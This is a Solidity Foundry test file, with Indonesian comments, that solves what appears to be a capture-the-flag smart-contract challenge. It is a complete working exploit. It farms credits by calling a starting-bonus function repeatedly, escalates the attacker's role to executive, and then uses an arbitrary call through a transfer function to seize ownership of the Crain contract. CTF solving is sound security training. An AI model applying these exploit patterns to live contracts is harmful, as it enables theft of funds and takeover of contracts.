// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/Setup.sol";

contract Solve is Test {
    Setup setup;
    CrainExecutive cexe;
    Crain crain;
    address attacker = makeAddr("hengker_bwang");

    function setUp() public {
        // [FIX] Kirim 100 Ether ke Setup agar dia bisa membiayai deployment CrainExecutive
        setup = new Setup{value: 100 ether}(); 
        
        cexe = setup.cexe();
        crain = setup.crain();
        
        // Modal awal buat attacker (just in case)
        vm.deal(attacker, 10 ether);
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        console.log("=== START EXPLOIT ===");
        console.log("Attacker:", attacker);
        
        // 1. Jadi Employee
        cexe.becomeEmployee();

        // 2. Farm Credits (Bug Abuse)
        // Kita butuh 5 Ether, spam bug ini 6x
        for(uint i = 0; i < 6; i++) {
            cexe.claimStartingBonus();
        }
        
        console.log("Credit:", cexe.balanceOf(attacker));

        // 3. Naik Jabatan
        cexe.becomeManager();
        cexe.becomeExecutive();
        console.log("Jabatan: Executive (Success)");

        // 4. Kudeta (Arbitrary Call via transfer)
        console.log("Melakukan Kudeta...");
        
        bytes memory payload = abi.encodeWithSelector(
            Crain.ascendToCrain.selector, 
            attacker
        );

        // cexe.transfer(to, amount, payload)
        cexe.transfer(address(crain), 0, payload);

        vm.stopPrank();

        // Verifikasi
        bool solved = setup.isSolved();
        console.log("Is Solved?", solved);
        console.log("New Owner:", crain.crain());

        assertTrue(solved, "GAGAL: Challenge belum solved");
        assertEq(crain.crain(), attacker, "GAGAL: Owner belum berubah");
    }
}
